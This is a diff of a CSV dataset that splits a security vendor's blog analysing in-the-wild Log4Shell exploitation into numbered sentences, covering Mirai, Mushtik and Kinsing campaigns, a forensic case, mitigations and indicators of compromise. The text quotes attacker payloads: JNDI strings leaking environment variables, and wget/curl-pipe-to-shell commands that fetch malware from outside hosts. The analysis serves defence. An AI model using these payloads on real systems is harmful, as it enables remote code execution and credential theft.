@@ -1,35 +1,35 @@
 Number,Content
-"""Sentence 1","blog
+Sentence 1,"blog
 december 13, 2021
 analysis of initial in the wild attacks exploiting log4shell/log4j/cve-2021-44228
 
 introduction
 
 log4j is an open-source logging platform running on java and built-in to many web platforms."
-"""Sentence 2","public reports of exploitation started on december 9th, followed by wider exploitation on december 10th onwards:
+Sentence 2,"public reports of exploitation started on december 9th, followed by wider exploitation on december 10th onwards:
 
 
 number of scans per day for cve-2021-44228 – data from binaryedge.io
 
 the exploit allows remote code execution, and relies upon log4j loading data from ldap via a jndi (java naming and directory interface) interface."
-"""Sentence 3","below we have outlined the attacks we have seen in the wild so far, as well as a forensic investigation of a server compromised in one of the attacks."
-"""Sentence 4",we’ve released a playbook on how to respond to compromises in docker & kubernetes environments – you can get a free copy here.
-"""Sentence 5","environment variable scanning
+Sentence 3,"below we have outlined the attacks we have seen in the wild so far, as well as a forensic investigation of a server compromised in one of the attacks."
+Sentence 4,we’ve released a playbook on how to respond to compromises in docker & kubernetes environments – you can get a free copy here.
+Sentence 5,"environment variable scanning
 
 we have started to see both attacks and security researchers exploit the ability to incorporate environment variables into outgoing jndi requests."
-"""Sentence 6","unlike the remote code execution vulnerabilities which require importing data over ldap, the environment variable based attacks can run on the latest versions of java."
-"""Sentence 7",the rce itself requires an older version of java from 2018 or before.
-"""Sentence 8",we can see in data from binaryedge the known bad ip address 47.75.82[.
-"""Sentence 9","]85 sending the environment and potentially return: 
+Sentence 6,"unlike the remote code execution vulnerabilities which require importing data over ldap, the environment variable based attacks can run on the latest versions of java."
+Sentence 7,the rce itself requires an older version of java from 2018 or before.
+Sentence 8,we can see in data from binaryedge the known bad ip address 47.75.82[.
+Sentence 9,"]85 sending the environment and potentially return: 
 
 get / http/1.1\r\nhost: 47.75.82.85:443\r\n
 user-agent: ${${env:env_name:-j}n${env:env_name:-d}i${env:env_name:-:}${env:env_name:-l}d${env:env_name:-a}p${env:env_name:-:}//45.146.164.160:8081/w}
 \r\ncontent-type: application/json
 \r\naccept-encoding: gzip\r\nconnection: close\r\n\r\n
 the ip addresses 96.234.173[."
-"""Sentence 10",]145 and 154.21.28[.
-"""Sentence 11",]76 are sending the java_version as a dns request to interactsh[.
-"""Sentence 12","]com, a service popular with security researchers:
+Sentence 10,]145 and 154.21.28[.
+Sentence 11,]76 are sending the java_version as a dns request to interactsh[.
+Sentence 12,"]com, a service popular with security researchers:
 
 get / http/1.1
 \r\nhost: 47.106.202.101:7401
@@ -38,13 +38,13 @@ get / http/1.1
 \r\nauthorization: ${jndi:ldap://${env:java_version}.c6v09ky2vtc000092300gdpor3hyyyyyb.interactsh.com}
 \r\nreferer: ${jndi:ldap://${env:java_version}.c6v09ky2vtc000092300gdpor3hyyyyyb.interactsh.com}\r\n
 sophos have reported that they have also seen attackers stealing environment variables such as aws_secret_access_key."
-"""Sentence 13",which would enable an attacker to have the same access to your aws environment (.e.g.
-"""Sentence 14",list and download files from s3 storage) as the system they compromised.
-"""Sentence 15","mirai botnet activity
+Sentence 13,which would enable an attacker to have the same access to your aws environment (.e.g.
+Sentence 14,list and download files from s3 storage) as the system they compromised.
+Sentence 15,"mirai botnet activity
 
 a number of botnets have been observed exploiting the vulnerability."
-"""Sentence 16",starting december 11th we saw traffic such as this from 45.137.21[.
-"""Sentence 17","]9:
+Sentence 16,starting december 11th we saw traffic such as this from 45.137.21[.
+Sentence 17,"]9:
 
 post / http/1.1\r\n
 user-agent: ${jndi:ldap://45.137.21.9:1389/basic/command/base64/d2dldcbodhrwoi8vnjiumjewljezmc4yntavbgguc2g7y2htb2qgk3ggbgguc2g7li9sac5zaa==}
@@ -57,15 +57,15 @@ the base64 decodes to:
 
 wget http://62.210.130.250/lh.sh;chmod +x lh.sh;./lh.sh
 the first stage payload is a shell script from http://62.210.130[."
-"""Sentence 18","]250/lh.sh which then installs the mirai binary appropriate for the targeted system, e.g."
-"""Sentence 19",http://62.210.130[.
-"""Sentence 20","]250/web/admin/x86
+Sentence 18,"]250/lh.sh which then installs the mirai binary appropriate for the targeted system, e.g."
+Sentence 19,http://62.210.130[.
+Sentence 20,"]250/web/admin/x86
 
 as usual with mirai, is served from an open directory:
 
 
 the mirai samples then connect to the command and control server nazi[.]uy."
-"""Sentence 21","mushtik activity
+Sentence 21,"mushtik activity
 
 starting december 11th, we started to see activity from a number of ip ranges sending traffic such as this:
 
@@ -83,7 +83,7 @@ sourcefileexploit.javajava/lang/string
 curl http://18.228.7.109/.log/log | sh
 java/lang/exceptionjava/lang/object
 it is clear it executes the shell script at http://18.228.7[."
-"""Sentence 22","]109/.log/log :
+Sentence 22,"]109/.log/log :
 
 wget -o /tmp/pty3 http://18.228.7.109/.log/pty3; chmod +x /tmp/pty3;
 chmod 700 /tmp/pty3; /tmp/pty3 &wget -o /tmp/pty4 http://18.228.7.109/.log/pty4;
@@ -93,14 +93,14 @@ chmod 700 /tmp/pty2; /tmp/pty2 &wget -o /tmp/pty1 http://18.228.7.109/.log/pty1;
 
 (curl http://159.89.182.117/wp-content/themes/twentyseventeen/ldm || wget -qo - http://159.89.182.117/wp-content/themes/twentyseventeen/ldm)|bash
 these scripts then install mushtik, a variant of the classic tsunami linux backdoor."
-"""Sentence 23","responding to a kinsing compromise
+Sentence 23,"responding to a kinsing compromise
 
 we set up a number of honeypots of outdated installations containing log4j."
-"""Sentence 24","after a few hours, we noticed that an old apache solr install was showing extremely high cpu utilization:
+Sentence 24,"after a few hours, we noticed that an old apache solr install was showing extremely high cpu utilization:
 
 
 we acquired a full forensic copy of the system with cado response and commenced an investigation."
-"""Sentence 25","it was immediately clear that a number of malicious files were present on the system – red dots here indicate folders where a file was detected as malware:
+Sentence 25,"it was immediately clear that a number of malicious files were present on the system – red dots here indicate folders where a file was detected as malware:
 
 
 most miners drop a payload under /tmp and this is no exception – the crypto-currency minder  xmrig is deployed at /tmp/kdevtmpfsi :
@@ -120,8 +120,8 @@ we didn’t directly capture the initial exploitation, however we have seen deli
 
 get / http/1.1 200 1121 - ${jndi:ldap://45.155.205.233:12344/basic/command/base64/(curl -s 45.155.205.233:5874/$your_ip:443||wget -q -o- 45.155.205.233:5874/$your_ip:443)|bash}
 this java object payload would then pull in and execute the installation script at http://45.137.155[."
-"""Sentence 26",]55/ex.sh – as recorded by omri segev moyal.
-"""Sentence 27","targeted activity
+Sentence 26,]55/ex.sh – as recorded by omri segev moyal.
+Sentence 27,"targeted activity
 
 a typical chain of events for exploits is:
 
@@ -138,63 +138,63 @@ recommendations and mitigations
 a number of mitigations can be employed to reduce the impact of log4shell:
 
 upgrade log4j to the latest version (>=2.15.0)."
-"""Sentence 28",upgrade java installations to 2019 or later editions.
-"""Sentence 29","where that isn’t possible, you can manually set the setting com.sun.jndi.rmi.object.trusturlcodebase to false."
-"""Sentence 30",setting either the system property log4j2.formatmsgnolookups or the environment variable log4j_format_msg_no_lookups to true.
-"""Sentence 31","if possible, block outgoing ldap traffic."
-"""Sentence 32",review all vulnerable internet facing systems for signs of compromise.
-"""Sentence 33","if any systems show signs of compromise, we recommend that you investigate each system to determine what malicious activity has occurred."
-"""Sentence 34","this could include what data or accounts may have been exposed, if propagation to other systems had occurred, or if other unknown backdoors exist, and then determine if you need to take any further incident response actions."
-"""Sentence 35",you may wish to forensically capture then reinstall and apply updates where feasible.
-"""Sentence 36","for systems that have been impacted in aws, we also recommend that you monitor connections to the aws console for newly deployed ec2 instances, access to existing ec2 instances or s3 buckets using potentially compromised aws credentials."
-"""Sentence 37",we’ve released a playbook on how to respond to compromises in docker & kubernetes environments – you can get a free copy here.
-"""Sentence 38","indicators of compromise
+Sentence 28,upgrade java installations to 2019 or later editions.
+Sentence 29,"where that isn’t possible, you can manually set the setting com.sun.jndi.rmi.object.trusturlcodebase to false."
+Sentence 30,setting either the system property log4j2.formatmsgnolookups or the environment variable log4j_format_msg_no_lookups to true.
+Sentence 31,"if possible, block outgoing ldap traffic."
+Sentence 32,review all vulnerable internet facing systems for signs of compromise.
+Sentence 33,"if any systems show signs of compromise, we recommend that you investigate each system to determine what malicious activity has occurred."
+Sentence 34,"this could include what data or accounts may have been exposed, if propagation to other systems had occurred, or if other unknown backdoors exist, and then determine if you need to take any further incident response actions."
+Sentence 35,you may wish to forensically capture then reinstall and apply updates where feasible.
+Sentence 36,"for systems that have been impacted in aws, we also recommend that you monitor connections to the aws console for newly deployed ec2 instances, access to existing ec2 instances or s3 buckets using potentially compromised aws credentials."
+Sentence 37,we’ve released a playbook on how to respond to compromises in docker & kubernetes environments – you can get a free copy here.
+Sentence 38,"indicators of compromise
 
 environment variable scanning
 
 45.146.164[."
-"""Sentence 39","]160
+Sentence 39,"]160
 
 interactsh[."
-"""Sentence 40","]com
+Sentence 40,"]com
 
 mirai
 
 45.137.21[."
-"""Sentence 41","]9
+Sentence 41,"]9
 
 http://62.210.130[."
-"""Sentence 42","]250/lh.sh
+Sentence 42,"]250/lh.sh
 
 http://62.210.130[."
-"""Sentence 43","]250/web/admin/x86
+Sentence 43,"]250/web/admin/x86
 
 nazi[."
-"""Sentence 44","]uy
+Sentence 44,"]uy
 
 mushtik
 
 45.130.229[."
-"""Sentence 45","]168
+Sentence 45,"]168
 
 18.228.7[."
-"""Sentence 46","]109
+Sentence 46,"]109
 
 159.89.182[."
-"""Sentence 47","]117
+Sentence 47,"]117
 
 4d040caffa28e6a0fdc0d274547cf1c7983996fc33e51b0b2c511544f030d71b
 
 kinsing
 
 45.155.205[."
-"""Sentence 48","]233
+Sentence 48,"]233
 
 http://93.189.42[."
-"""Sentence 49","]8/kinsing
+Sentence 49,"]8/kinsing
 
 http://93.189.42[."
-"""Sentence 50","]8/lh.sh
+Sentence 50,"]8/lh.sh
 
 yara rules
 
